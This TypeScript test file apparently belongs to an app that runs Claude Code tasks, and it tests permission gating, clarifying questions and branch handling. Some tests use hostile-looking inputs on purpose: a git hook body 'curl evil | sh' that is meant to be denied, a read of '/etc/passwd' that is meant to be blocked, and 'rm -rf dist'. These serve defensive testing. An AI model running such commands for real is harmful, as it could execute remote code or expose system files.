// tests/main/taskManager.test.ts
import { mkdtemp } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, onTestFinished, test, vi } from 'vitest'
import type { PermissionResult } from '@anthropic-ai/claude-agent-sdk'
import type { AppEvent } from '@shared/ipc'
import { IMPLEMENT_START_REF, msgDisplay, startsImplementation } from '@shared/protocol'
import { BUILTIN_TOOLS } from '../../src/main/permissions/gate'
import { Repository } from '../../src/main/store/repository'
import { Store } from '../../src/main/store/store'
import { TaskManager, type TaskManagerDeps } from '../../src/main/tasks/taskManager'
import { sampleReport } from '../fixtures/report'
import { assistantText, FakeClaude, fakeGit, until } from './fakeClaude'

async function setup(over: Partial<TaskManagerDeps> = {}) {
  const root = await mkdtemp(join(tmpdir(), 'harness-tm-'))
  const repo = new Repository(new Store(root), '/home/me')
  await repo.saveRepos([{ id: 'r1', name: 'shop-api', path: '/repos/shop-api', addedAt: 'x' }])
  const claude = new FakeClaude()
  const git = fakeGit()
  const events: AppEvent[] = []
  const verify = vi.fn<TaskManagerDeps['verify']>(async (_cwd, commands) =>
    commands.map((command) => ({ command, exitCode: 0, durationMs: 1, outputTail: 'ok' }))
  )
  let n = 0
  const tm = new TaskManager({
    repo,
    git,
    queryFn: claude.queryFn,
    createToolServer: claude.createToolServer,
    getClaudePath: () => '/bin/claude',
    emit: (e) => events.push(e),
    verify,
    newId: () => `id${++n}`,
    now: () => '2026-10-07T10:00:00.000Z',
    ...over
  })
  await tm.init()
  const create = async () => {
    const t = await tm.createTask({
      repoId: 'r1',
      request: '加上登入失敗鎖定',
      baseBranch: 'main',
      model: 'claude-opus-5-5'
    })
    await tm.whenIdle(t.id)
    return t.id
  }
  return { tm, claude, git, events, verify, repo, create }
}

const askQ1 = {
  question_id: 'q1',
  question: '計數單位？',
  options: [
    { id: 'acct', label: '帳號' },
    { id: 'acct_ip', label: '帳號 + IP' }
  ],
  allow_free_text: true
}

describe('TaskManager：建立任務與釐清', () => {
  test('建立 worktree、送出需求、記下 session', async () => {
    const { tm, claude, git, events, create } = await setup()
    const id = await create()
    const t = tm.get(id)
    expect(git.calls[0]).toBe(
      `worktree /home/me/.harness/worktrees/shop-api/20261007-${id} harness/20261007-${id} main`
    )
    expect(claude.calls[0].prompt).toBe('加上登入失敗鎖定')
    expect(claude.calls[0].options).toMatchObject({
      cwd: t.worktreePath,
      model: 'claude-opus-5-5',
      settingSources: ['project'],
      pathToClaudeCodeExecutable: '/bin/claude'
    })
    expect(claude.calls[0].options.resume).toBeUndefined()
    // canUseTool 與 PreToolUse hook 都要接上（hook 擋住專案 allow 規則的繞過）
    expect(claude.calls[0].options.canUseTool).toBeTypeOf('function')
    expect(claude.calls[0].options.hooks?.PreToolUse?.[0].hooks).toHaveLength(1)
    // 不載入 claude.ai 帳號上的連接器（Harness 一律拒絕使用，只會增加噪音），其餘環境變數照傳
    // 只提供 PermissionGate 有規則的內建工具（新版 Claude Code 預設沒有 Glob／Grep，釐清時就找不到檔案）
    expect(claude.calls[0].options.tools).toEqual(BUILTIN_TOOLS)
    expect(claude.calls[0].options.env).toMatchObject({
      ENABLE_CLAUDEAI_MCP_SERVERS: 'false',
      // 呼叫這些工具後安靜結束這一輪是對的：Claude Code 不要再催 Claude 寫一段話（重述問題、說已送出）
      CLAUDE_CODE_TERMINAL_MCP_TOOLS:
        'mcp__harness__ask_user,mcp__harness__propose_spec,mcp__harness__conclude_branch,mcp__harness__submit_report',
      PATH: process.env.PATH
    })
    expect(claude.calls[0].tools).toEqual([
      'ask_user',
      'propose_spec',
      'update_plan',
      'submit_report'
    ])
    expect(t).toMatchObject({ status: 'clarifying', runState: 'idle', mainSessionId: 'sess-0' })
    expect(events.some((e) => e.type === 'task' && e.task.runState === 'running')).toBe(true)
  })

  test('不把 API key 與其他驗證方式、端點的環境變數傳給 Claude Code（一律用訂閱登入）', async () => {
    vi.stubEnv('ANTHROPIC_API_KEY', 'sk-ant-x')
    vi.stubEnv('ANTHROPIC_BASE_URL', 'https://proxy.example')
    vi.stubEnv('CLAUDE_CODE_USE_BEDROCK', '1')
    onTestFinished(() => {
      vi.unstubAllEnvs()
    })
    const { claude, create } = await setup()
    await create()
    const env = claude.calls[0].options.env!
    for (const k of [
      'ANTHROPIC_API_KEY',
      'ANTHROPIC_AUTH_TOKEN',
      'ANTHROPIC_BASE_URL',
      'CLAUDE_CODE_USE_BEDROCK',
      'CLAUDE_CODE_USE_VERTEX',
      'CLAUDE_CODE_USE_FOUNDRY'
    ])
      expect(env, k).not.toHaveProperty(k)
    expect(env.PATH).toBe(process.env.PATH)
    expect(process.env.ANTHROPIC_API_KEY).toBe('sk-ant-x')
  })

  test('ask_user 建立問題卡片；回答後以 resume 送出 [answer]', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.askUser(askQ1)
    }
    const id = await create()
    expect(tm.get(id).questions[0]).toMatchObject({
      id: 'q1',
      status: 'open',
      options: askQ1.options
    })
    expect((await tm.timeline(id)).map((e) => e.kind)).toEqual(['user_text', 'question'])

    await tm.answerQuestion(id, 'q1', { optionId: 'acct_ip' })
    await tm.whenIdle(id)
    expect(tm.get(id).questions[0]).toMatchObject({
      status: 'answered',
      answer: { optionId: 'acct_ip' }
    })
    expect(claude.calls[1].prompt).toBe('[answer question_id=q1 option=acct_ip] 帳號 + IP')
    expect(claude.calls[1].options.resume).toBe('sess-0')
  })

  test('Claude 重新提問已回答的問題時，時間軸再出現一次問題卡片', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.askUser(askQ1)
    }
    const id = await create()
    claude.script = async ({ call, sink }) => {
      if (call === 1) await sink.askUser({ ...askQ1, question: '計數單位要再確認一次' })
    }
    await tm.answerQuestion(id, 'q1', { optionId: 'acct_ip' })
    await tm.whenIdle(id)
    expect(tm.get(id).questions[0]).toMatchObject({ status: 'open', text: '計數單位要再確認一次' })
    const questions = (await tm.timeline(id)).filter((e) => e.kind === 'question')
    expect(questions.map((e) => e.ref)).toEqual(['q1', 'q1'])
  })

  test('反問：回答文字進入卡片，Claude 以同一 question_id 更新卡片', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.askUser(askQ1)
    }
    const id = await create()
    // 第二輪：先輸出文字，稍後（同一輪內）再以同一 question_id 更新卡片
    claude.script = async ({ call, sink }) => {
      if (call !== 1) return
      setTimeout(() => void sink.askUser({ ...askQ1, recommended_option_id: 'acct_ip' }), 20)
      return [assistantText('帳號 + IP 可以避免被惡意鎖帳號。')]
    }
    await tm.counterQuestion(id, 'q1', '只用帳號有什麼問題？')
    await tm.whenIdle(id)
    const q = tm.get(id).questions[0]
    expect(claude.calls[1].prompt).toBe('[counter_question question_id=q1] 只用帳號有什麼問題？')
    expect(q.followups).toEqual([
      { role: 'user', text: '只用帳號有什麼問題？' },
      { role: 'assistant', text: '帳號 + IP 可以避免被惡意鎖帳號。' }
    ])
    expect(q.recommendedOptionId).toBe('acct_ip')
    expect((await tm.timeline(id)).filter((e) => e.kind === 'assistant_text')).toHaveLength(0)
    // 回答反問後更新的卡片留在原位：不另外放一張
    expect((await tm.timeline(id)).filter((e) => e.kind === 'question')).toHaveLength(1)
  })

  test('回答反問時沒寫文字、只把回答放進說明：卡片裡以新的說明當作回覆', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.askUser({ ...askQ1, context: '連續失敗 5 次就鎖定。' })
    }
    const id = await create()
    // 第二輪：沒有輸出文字，直接以同一 question_id 更新卡片，回答寫在 context
    claude.script = async ({ call, sink }) => {
      if (call === 1) await sink.askUser({ ...askQ1, context: 'IP＝登入請求的來源位址。' })
    }
    await tm.counterQuestion(id, 'q1', 'IP 是指什麼？')
    await tm.whenIdle(id)
    const q = tm.get(id).questions[0]
    expect(q.followups).toEqual([
      { role: 'user', text: 'IP 是指什麼？' },
      { role: 'assistant', text: 'IP＝登入請求的來源位址。' }
    ])
    expect(q.context).toBe('IP＝登入請求的來源位址。')
  })

  test('回答反問時沒寫文字、說明也沒變：卡片裡提示問題已更新，不讓反問沒有回覆', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.askUser(askQ1)
    }
    const id = await create()
    claude.script = async ({ call, sink }) => {
      if (call === 1) await sink.askUser({ ...askQ1, recommended_option_id: 'acct_ip' })
    }
    await tm.counterQuestion(id, 'q1', '哪個比較好？')
    await tm.whenIdle(id)
    expect(tm.get(id).questions[0].followups).toEqual([
      { role: 'user', text: '哪個比較好？' },
      { role: 'assistant', text: '已依你的反問更新上面的問題與選項。' }
    ])
  })

  test('重新提問還開著的問題（不是回答反問）時，卡片移到時間軸最新的位置', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.askUser(askQ1)
    }
    const id = await create()
    // 例如帶回分岔結論後，Claude 先說明再重新送出第一題（同一個 question_id，卡片還開著）
    claude.script = async ({ call, sink }) => {
      if (call !== 1) return
      setTimeout(() => void sink.askUser({ ...askQ1, question: '計數單位（依分岔結論）' }), 20)
      return [assistantText('採用分岔的鎖定規則。')]
    }
    await tm.send(id, 'main', '補充：只針對 /login')
    await tm.whenIdle(id)
    const tl = await tm.timeline(id)
    expect(tl.map((e) => e.kind)).toEqual([
      'user_text',
      'question',
      'user_text',
      'assistant_text',
      'question'
    ])
    expect(tl.filter((e) => e.kind === 'question').map((e) => e.ref)).toEqual(['q1', 'q1'])
    expect(tm.get(id).questions).toHaveLength(1)
    expect(tm.get(id).questions[0]).toMatchObject({
      status: 'open',
      text: '計數單位（依分岔結論）'
    })
  })

  test('一般訊息寫入時間軸', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async () => [assistantText('好的')]
    await tm.send(id, 'main', '補充：只針對 /login')
    await tm.whenIdle(id)
    expect((await tm.timeline(id)).slice(-2).map((e) => [e.kind, e.text])).toEqual([
      ['user_text', '補充：只針對 /login'],
      ['assistant_text', '好的']
    ])
  })

  test('子代理的工具呼叫寫入時間軸並標成 subagent；子代理的文字不寫入', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async () => [
      {
        type: 'assistant',
        parent_tool_use_id: null,
        message: {
          content: [{ type: 'tool_use', id: 'a1', name: 'Agent', input: { prompt: '找檔案' } }]
        }
      },
      {
        type: 'assistant',
        parent_tool_use_id: 'a1',
        message: {
          content: [
            { type: 'text', text: '我來找找' },
            { type: 'tool_use', id: 's1', name: 'Read', input: { file_path: '/x/a.ts' } }
          ]
        }
      }
    ]
    const id = await create()
    const events = (await tm.timeline(id)).filter((e) => e.kind !== 'user_text')
    expect(events.map((e) => [e.kind, e.tool])).toEqual([
      ['tool_call', { id: 'a1', name: 'Agent', input: { prompt: '找檔案' } }],
      ['tool_call', { id: 's1', name: 'Read', input: { file_path: '/x/a.ts' }, subagent: true }]
    ])
  })

  test('同時送出兩則訊息不會開兩段執行', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    // 第一段執行卡住直到兩則都送出：第二則一定得插話進這段執行，不受機器快慢影響
    const release = deferred()
    claude.script = async () => {
      await release.promise
      return [assistantText('收到')]
    }
    claude.maxActive = 0
    await Promise.all([
      tm.send(id, 'main', '第一則', { silent: true }),
      tm.send(id, 'main', '第二則', { silent: true })
    ])
    release.resolve()
    await tm.whenIdle(id)
    // 第二則插話進第一段執行（FakeClaude 不讀插話），所以只多一次 query
    expect(claude.calls.map((c) => c.prompt).slice(1)).toEqual(['第一則'])
    expect(claude.maxActive).toBe(1)
    expect(tm.get(id).runState).toBe('idle')
  })

  test('執行失敗時記錄錯誤', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async () => {
      throw new Error('CLI crashed')
    }
    const id = await create()
    expect(tm.get(id)).toMatchObject({ runState: 'error', error: 'CLI crashed' })
  })
})

describe('TaskManager：分岔', () => {
  test('從主線 fork、續接分岔、整理結論並帶回主線', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.askUser(askQ1)
    }
    const id = await create()
    await tm.counterQuestion(id, 'q1', '差在哪？')
    await tm.whenIdle(id)

    claude.script = async () => [assistantText('Redis 可以共享狀態')]
    const b = await tm.openBranch(id, {
      title: '計數存放位置',
      fromQuestionId: 'q1',
      seed: 'Redis 和 in-memory 差在哪？'
    })
    await tm.whenIdle(id)
    const forkCall = claude.calls.at(-1)!
    expect(forkCall.options).toMatchObject({ resume: 'sess-0', forkSession: true })
    expect(forkCall.tools).toEqual(['conclude_branch'])
    expect(forkCall.prompt).toContain('[branch_open]')
    expect(forkCall.prompt).toContain('來源問題：計數單位？')
    expect(forkCall.prompt).toContain('使用者：差在哪？')
    expect(tm.get(id).branches[0]).toMatchObject({
      id: b.id,
      sessionId: expect.stringMatching(/^fork-/),
      running: false
    })
    expect(tm.get(id).mainSessionId).toBe('sess-0')
    const tl = await tm.timeline(id)
    expect(tl.filter((e) => e.channel === `branch:${b.id}`).map((e) => e.kind)).toEqual([
      'user_text',
      'assistant_text'
    ])

    claude.script = async ({ sink }) => {
      await sink.concludeBranch({ decision: '用 Redis', rationale: '多台機器', deferred: [] })
    }
    await tm.concludeBranch(id, b.id)
    await tm.whenIdle(id)
    expect(claude.calls.at(-1)!.options).toMatchObject({
      resume: tm.get(id).branches[0].sessionId
    })
    expect(claude.calls.at(-1)!.options.forkSession).toBeUndefined()
    expect(tm.get(id).branches[0]).toMatchObject({
      status: 'concluding',
      conclusion: { decision: '用 Redis' }
    })

    claude.script = async () => []
    await tm.confirmBranch(id, b.id)
    await tm.whenIdle(id)
    const t = tm.get(id)
    expect(t.branches[0].status).toBe('concluded')
    expect(t.decisions[0]).toMatchObject({
      id: 'd1',
      text: '用 Redis',
      source: { type: 'branch', ref: b.id }
    })
    expect(claude.calls.at(-1)!.prompt).toBe(
      `[branch_conclusion branch=${b.id}] 決策：用 Redis\n原因：多台機器`
    )
    expect(claude.calls.at(-1)!.options.resume).toBe('sess-0')
    expect((await tm.timeline(id)).at(-1)).toMatchObject({
      channel: 'main',
      kind: 'decision',
      ref: 'd1'
    })
    await expect(tm.confirmBranch(id, b.id)).rejects.toThrow('已經帶回主線')
  })

  test('conclude_branch 帶 title 時換成 Claude 整理的主題；沒帶就保留原本的標題', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async () => [assistantText('可以')]
    const b = await tm.openBranch(id, { title: '鎖定期間要回什麼', seed: '針對以下內容：…' })
    await tm.whenIdle(id)

    claude.script = async ({ sink }) => {
      await sink.concludeBranch({ decision: '回 429', rationale: '慣例', deferred: [] })
    }
    await tm.concludeBranch(id, b.id)
    await tm.whenIdle(id)
    expect(tm.get(id).branches[0].title).toBe('鎖定期間要回什麼')

    // 只有空白的標題（schema 整理成空字串）也保留原本的標題
    claude.script = async ({ sink }) => {
      await sink.concludeBranch({ title: '', decision: '回 429', rationale: '慣例', deferred: [] })
    }
    await tm.concludeBranch(id, b.id)
    await tm.whenIdle(id)
    expect(tm.get(id).branches[0].title).toBe('鎖定期間要回什麼')

    claude.script = async ({ sink }) => {
      await sink.concludeBranch({
        title: '鎖定期間的回應碼',
        decision: '回 429',
        rationale: '慣例',
        deferred: []
      })
    }
    await tm.concludeBranch(id, b.id)
    await tm.whenIdle(id)
    expect(tm.get(id).branches[0]).toMatchObject({
      title: '鎖定期間的回應碼',
      status: 'concluding',
      conclusion: { decision: '回 429', rationale: '慣例', deferred: [] }
    })
    // 結論本身不帶標題
    expect(tm.get(id).branches[0].conclusion).not.toHaveProperty('title')
  })

  test('主線還沒有 session 時不能分岔', async () => {
    const { tm, repo } = await setup()
    const { makeTask } = await import('../fixtures/task')
    await repo.saveTask(makeTask({ id: 'x' }))
    await tm.init()
    await expect(tm.openBranch('x', { title: 't' })).rejects.toThrow('回覆至少一次')
  })

  test('主線不能呼叫 conclude_branch', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    let error: unknown
    claude.script = async ({ sink }) => {
      try {
        await sink.concludeBranch({ decision: 'x', rationale: 'y', deferred: [] })
      } catch (e) {
        error = e
      }
    }
    await tm.send(id, 'main', '結束')
    await tm.whenIdle(id)
    expect(String(error)).toContain('只能在分岔中使用')
  })
})

const spec = {
  title: '帳號鎖定',
  summary: 's',
  in_scope: ['a'],
  out_of_scope: [],
  decisions: [],
  steps: ['實作'],
  acceptance: ['測試通過']
}
const signalOf = () => ({ signal: new AbortController().signal }) as never
/** canUseTool 的 options，帶 SDK 給的 toolUseID */
const toolOpts = (toolUseID: string) =>
  ({ signal: new AbortController().signal, toolUseID }) as never
/** 測試用：看 TaskManager 還記著幾個被拒絕的 tool_use id（應在執行結束時清掉） */
const deniedCount = (tm: TaskManager) =>
  (tm as unknown as { deniedToolUses: { size: number } }).deniedToolUses.size
/** 測試用：看 TaskManager 還記著幾個被規則擋下的 tool_use id（工具結果處理後或執行結束時清掉） */
const blockedCount = (tm: TaskManager) =>
  (tm as unknown as { blockedToolUses: { size: number } }).blockedToolUses.size
const toolResult = (toolUseId: string, text: string) => ({
  type: 'user',
  parent_tool_use_id: null,
  message: {
    content: [{ type: 'tool_result', tool_use_id: toolUseId, is_error: true, content: text }]
  }
})

describe('TaskManager：規格與實作', () => {
  test('propose_spec → spec_review；要求修改回到 clarifying；核准進入 implementing', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    expect(tm.get(id)).toMatchObject({ status: 'spec_review', title: '帳號鎖定' })
    expect(tm.get(id).specs[0].version).toBe(1)

    claude.script = async ({ sink }) => {
      await sink.proposeSpec({ ...spec, summary: 's2' })
    }
    await tm.requestSpecChanges(id, '上限改 10 次')
    await tm.whenIdle(id)
    expect(claude.calls.at(-1)!.prompt).toBe('[spec_feedback] 上限改 10 次')
    expect(tm.get(id)).toMatchObject({ status: 'spec_review' })
    expect(tm.get(id).specs).toHaveLength(2)

    claude.script = async ({ sink }) => {
      await sink.updatePlan({ steps: [{ id: 's1', title: '寫程式', status: 'running' }] })
    }
    await tm.approveSpec(id)
    await tm.whenIdle(id)
    expect(claude.calls.at(-1)!.prompt).toContain('[spec_approved]')
    expect(tm.get(id).status).toBe('implementing')
    // 實作畫面靠這則訊息的標記找出實作從哪裡開始；要求修改不是起點
    const userTexts = (await tm.timeline(id)).filter((e) => e.kind === 'user_text')
    const feedbackEntry = userTexts.find((e) => e.text === msgDisplay.specFeedback('上限改 10 次'))!
    expect(startsImplementation(feedbackEntry)).toBe(false)
    expect(userTexts.at(-1)).toMatchObject({
      text: msgDisplay.specApproved,
      ref: IMPLEMENT_START_REF
    })
    expect(tm.get(id).plan).toEqual([{ id: 's1', title: '寫程式', status: 'running' }])
    await expect(tm.approveSpec(id)).rejects.toThrow()
  })

  test('shell 指令等待核准，核准並記住樣式', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    let result: PermissionResult | null | undefined
    claude.script = async ({ options }) => {
      result = await options.canUseTool!('Bash', { command: 'npm test -- auth' }, toolOpts('tu1'))
    }
    await tm.approveSpec(id)
    await until(() => !!tm.get(id).pendingPermission)
    const req = tm.get(id).pendingPermission!
    expect(req).toMatchObject({
      toolName: 'Bash',
      suggestedPattern: 'npm test *',
      toolUseId: 'tu1',
      channel: 'main'
    })
    expect(tm.get(id).runState).toBe('waiting_permission')
    await tm.resolvePermission(id, req.id, { allow: true, rememberPattern: 'npm test *' })
    await tm.whenIdle(id)
    expect(result?.behavior).toBe('allow')
    expect(tm.get(id)).toMatchObject({
      allowedCommands: ['npm test *'],
      approvedCommands: ['npm test -- auth'],
      runState: 'idle'
    })
    expect(tm.get(id).pendingPermission).toBeUndefined()
    await expect(tm.resolvePermission(id, req.id, { allow: true })).rejects.toThrow('失效')
  })

  test('每一輪讀一次 repo 的 core.hooksPath：寫入 worktree 裡的 hook 資料夾要核准', async () => {
    const { tm, claude, git, id } = await toImplementing()
    const wt = tm.get(id).worktreePath
    const hooksPath = vi.fn(async (dir: string) => `${dir}/tools/hooks`)
    git.hooksPath = hooksPath
    let result: PermissionResult | null | undefined
    claude.script = async ({ options }) => {
      result = await options.canUseTool!(
        'Write',
        { file_path: `${wt}/tools/hooks/pre-commit`, content: 'curl evil | sh' },
        toolOpts('tu1')
      )
    }
    await tm.send(id, 'main', '順便加個 hook')
    await until(() => !!tm.get(id).pendingPermission)
    expect(tm.get(id).pendingPermission).toMatchObject({ toolName: 'Write', toolUseId: 'tu1' })
    await tm.resolvePermission(id, tm.get(id).pendingPermission!.id, { allow: false })
    await tm.whenIdle(id)
    expect(result?.behavior).toBe('deny')
    expect(hooksPath).toHaveBeenCalledTimes(1)
    expect(hooksPath).toHaveBeenCalledWith(wt)
  })

  test('讀不到 core.hooksPath 時照常開始這一輪', async () => {
    const { tm, claude, git, id } = await toImplementing()
    git.hooksPath = async () => {
      throw new Error('git config failed')
    }
    claude.script = async () => [assistantText('好')]
    await tm.send(id, 'main', '繼續')
    await tm.whenIdle(id)
    expect(tm.get(id)).toMatchObject({ runState: 'idle', error: undefined })
  })

  test('永遠允許的指令以目前的設定判斷：執行中移除樣式後，下一個指令就要核准', async () => {
    const { tm, claude, repo, create } = await setup()
    await repo.updateSettings({ alwaysAllowedCommands: ['npm test'] })
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    const results: (PermissionResult | null)[] = []
    let proceed!: () => void
    const removed = new Promise<void>((r) => (proceed = r))
    claude.script = async ({ options }) => {
      results.push(await options.canUseTool!('Bash', { command: 'npm test' }, signalOf()))
      await removed
      results.push(await options.canUseTool!('Bash', { command: 'npm test' }, signalOf()))
    }
    await tm.approveSpec(id)
    await until(() => results.length === 1)
    expect(results[0]?.behavior).toBe('allow')
    expect(tm.get(id).pendingPermission).toBeUndefined()
    await repo.updateSettings({ alwaysAllowedCommands: [] })
    proceed()
    await until(() => !!tm.get(id).pendingPermission)
    await tm.resolvePermission(id, tm.get(id).pendingPermission!.id, { allow: false })
    await tm.whenIdle(id)
    expect(results.map((r) => r?.behavior)).toEqual(['allow', 'deny'])
  })

  test('同時有多個核准請求時依序顯示', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    const results: (PermissionResult | null)[] = []
    claude.script = async ({ options }) => {
      results.push(
        ...(await Promise.all([
          options.canUseTool!('Bash', { command: 'npm test' }, signalOf()),
          options.canUseTool!('Bash', { command: 'npm run lint' }, signalOf())
        ]))
      )
    }
    await tm.approveSpec(id)
    await until(() => !!tm.get(id).pendingPermission)
    const first = tm.get(id).pendingPermission!
    expect(first.input).toEqual({ command: 'npm test' })
    await tm.resolvePermission(id, first.id, { allow: false, message: '不要跑' })
    await until(
      () => tm.get(id).pendingPermission?.id !== first.id && !!tm.get(id).pendingPermission
    )
    const second = tm.get(id).pendingPermission!
    expect(second.input).toEqual({ command: 'npm run lint' })
    expect(tm.get(id).runState).toBe('waiting_permission')
    await tm.resolvePermission(id, second.id, { allow: true })
    await tm.whenIdle(id)
    expect(results.map((r) => r?.behavior)).toEqual(['deny', 'allow'])
    expect(results[0]).toMatchObject({ message: '不要跑' })
    expect(tm.get(id)).toMatchObject({ runState: 'idle', approvedCommands: ['npm run lint'] })
  })

  test('停止會拒絕等待中的核准並結束這一輪，不算錯誤', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    let result: PermissionResult | null | undefined
    claude.script = async ({ options }) => {
      result = await options.canUseTool!('Bash', { command: 'npm test' }, signalOf())
      await new Promise(() => undefined) // 卡住，直到被停止
    }
    await tm.approveSpec(id)
    await until(() => !!tm.get(id).pendingPermission)
    await tm.stop(id, 'main')
    await tm.whenIdle(id)
    expect(result).toMatchObject({ behavior: 'deny', message: '使用者停止了執行' })
    expect(tm.get(id).pendingPermission).toBeUndefined()
    expect(tm.get(id).runState).toBe('idle')
    expect(tm.get(id).error).toBeUndefined()
  })

  test('停止後時間軸留下「已停止」，畫面不會看起來像 Claude 沒反應', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async () => {
      await new Promise(() => undefined) // 卡住，直到被停止
    }
    await tm.send(id, 'main', '再看一下 /login')
    await tm.stop(id, 'main')
    await tm.whenIdle(id)
    expect((await tm.timeline(id)).at(-1)).toMatchObject({
      channel: 'main',
      kind: 'system',
      text: '已停止。輸入訊息就能繼續。'
    })
    // 沒有執行中的這一輪時按停止：不再多記一筆
    await tm.stop(id, 'main')
    await tm.whenIdle(id)
    expect((await tm.timeline(id)).filter((e) => e.kind === 'system')).toHaveLength(1)
  })

  test('分岔的核准請求不影響主線的執行狀態', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    let result: PermissionResult | null | undefined
    claude.script = async ({ options }) => {
      result = await options.canUseTool!('WebFetch', { url: 'https://example.com' }, signalOf())
    }
    await tm.openBranch(id, { title: '查資料' })
    await until(() => !!tm.get(id).pendingPermission)
    expect(tm.get(id).pendingPermission!.channel).toBe('branch:b1')
    expect(tm.get(id).runState).toBe('idle')
    expect(tm.get(id).branches[0].running).toBe(true)
    await tm.resolvePermission(id, tm.get(id).pendingPermission!.id, { allow: true })
    await tm.whenIdle(id)
    expect(result?.behavior).toBe('allow')
    expect(tm.get(id)).toMatchObject({ runState: 'idle', approvedCommands: [] })
    expect(tm.get(id).branches[0].running).toBe(false)
  })

  test('使用者拒絕的工具，時間軸上的工具結果標成已拒絕', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    claude.script = async ({ options }) => {
      await options.canUseTool!('Bash', { command: 'rm -rf dist' }, toolOpts('tu-deny'))
      return [toolResult('tu-deny', '先不要刪'), toolResult('tu-fail', 'exit 1')]
    }
    await tm.approveSpec(id)
    await until(() => !!tm.get(id).pendingPermission)
    await tm.resolvePermission(id, tm.get(id).pendingPermission!.id, {
      allow: false,
      message: '先不要刪'
    })
    await tm.whenIdle(id)
    const results = (await tm.timeline(id)).filter((e) => e.kind === 'tool_result')
    expect(results.map((e) => [e.tool?.id, e.tool?.denied])).toEqual([
      ['tu-deny', true],
      ['tu-fail', undefined]
    ])
  })

  test('Harness 規則擋下的工具（PreToolUse hook 或 canUseTool），時間軸上標成已阻擋並附上原因', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    claude.script = async ({ options }) => {
      // 釐清階段改檔：hook 擋下；讀 worktree 外的檔案：canUseTool 擋下
      const hook = options.hooks!.PreToolUse![0].hooks[0]
      await hook(
        {
          hook_event_name: 'PreToolUse',
          tool_name: 'Edit',
          tool_input: { file_path: '/x/README.md' },
          tool_use_id: 'tu-hook',
          session_id: 's',
          transcript_path: '',
          cwd: '/x'
        },
        'tu-hook',
        { signal: new AbortController().signal }
      )
      await options.canUseTool!('Read', { file_path: '/etc/passwd' }, toolOpts('tu-gate'))
      return [
        toolResult('tu-hook', 'PreToolUse:Edit hook error: 目前不是實作階段…'),
        toolResult('tu-gate', '只能讀取 worktree 內的檔案'),
        toolResult('tu-fail', 'exit 1')
      ]
    }
    await tm.send(id, 'main', '順便改 README')
    await tm.whenIdle(id)
    const results = (await tm.timeline(id)).filter((e) => e.kind === 'tool_result')
    expect(results.map((e) => [e.tool?.id, e.tool?.blocked, e.text])).toEqual([
      [
        'tu-hook',
        true,
        '目前不是實作階段，不能修改檔案。請用 ask_user 提問或用 propose_spec 提出規格。'
      ],
      ['tu-gate', true, '只能讀取 worktree 內的檔案'],
      ['tu-fail', undefined, 'exit 1']
    ])
    expect(blockedCount(tm)).toBe(0)
  })

  test('執行結束時清掉這段執行拒絕過、但沒等到工具結果的 tool_use id', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    claude.script = async ({ options }) => {
      // 規則擋下、但工具結果沒有來
      await options.canUseTool!('Read', { file_path: '/etc/passwd' }, toolOpts('tu-lost-block'))
      await options.canUseTool!('Bash', { command: 'rm -rf dist' }, toolOpts('tu-lost'))
    }
    await tm.approveSpec(id)
    await until(() => !!tm.get(id).pendingPermission)
    expect(blockedCount(tm)).toBe(1)
    await tm.resolvePermission(id, tm.get(id).pendingPermission!.id, { allow: false })
    await tm.whenIdle(id)
    expect(deniedCount(tm)).toBe(0)
    expect(blockedCount(tm)).toBe(0)
  })

  test('shutdown 清掉被拒絕的 tool_use id（執行卡住、不會結束）', async () => {
    const { tm, claude, create } = await setup()
    claude.script = async ({ call, sink }) => {
      if (call === 0) await sink.proposeSpec(spec)
    }
    const id = await create()
    claude.afterResult = 'hang_ignoring_abort'
    claude.script = async ({ options }) => {
      await options.canUseTool!('Bash', { command: 'rm -rf dist' }, toolOpts('tu-stuck'))
    }
    await tm.approveSpec(id)
    await until(() => !!tm.get(id).pendingPermission)
    await tm.resolvePermission(id, tm.get(id).pendingPermission!.id, { allow: false })
    await until(() => claude.results === 2)
    expect(deniedCount(tm)).toBe(1)
    await tm.shutdown(100)
    expect(deniedCount(tm)).toBe(0)
    claude.releaseHang()
  })

  test('執行中插話會送進同一輪', async () => {
    const { tm, claude, create } = await setup()
    const id = await create()
    let release!: () => void
    claude.script = async () => {
      await new Promise<void>((r) => {
        release = r
      })
    }
    await tm.send(id, 'main', '開始')
    await until(() => tm.get(id).runState === 'running' && !!release)
    const before = claude.calls.length
